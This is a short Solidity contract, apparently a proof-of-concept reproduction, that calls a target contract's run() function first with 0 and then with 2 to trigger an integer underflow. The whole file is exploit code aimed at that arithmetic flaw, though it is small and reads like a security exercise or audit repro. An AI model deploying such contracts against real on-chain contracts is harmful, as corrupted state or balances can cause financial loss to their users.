interface IVulnerableContract {
    function run(uint256 input) external;
}

contract ReproduceOverflow {
    IVulnerableContract public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = IVulnerableContract(_vulnerableAddress);
    }

    function triggerOverflow() public {
        vulnerable.run(0); // Initialize
        vulnerable.run(2); // Cause underflow (count is 1, subtracting 2 causes underflow)
    }
}